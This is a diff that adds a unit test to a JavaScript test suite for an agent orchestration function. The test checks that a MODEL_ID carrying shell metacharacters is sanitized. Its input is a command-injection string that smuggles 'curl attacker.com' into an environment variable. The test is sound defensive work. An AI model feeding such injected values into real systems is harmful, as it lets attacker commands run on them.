@@ -367,6 +367,24 @@ describe("runOrchestration", () => {
     exitSpy.mockRestore();
   });
 
+  it("rejects MODEL_ID with shell metacharacters", async () => {
+    const originalModelId = process.env.MODEL_ID;
+    process.env.MODEL_ID = '"; curl attacker.com; "';
+    const configure = mock(() => Promise.resolve());
+    const cloud = createMockCloud();
+    const agent = createMockAgent({
+      configure,
+    });
+
+    await runOrchestrationSafe(cloud, agent, "testagent");
+
+    // Invalid model ID should be sanitized to undefined
+    expect(configure).toHaveBeenCalledWith("sk-or-v1-test-key", undefined, undefined);
+    process.env.MODEL_ID = originalModelId;
+    stderrSpy.mockRestore();
+    exitSpy.mockRestore();
+  });
+
   // ── configure hook ──────────────────────────────────────────────────
 
   it("calls configure when defined on agent", async () => {
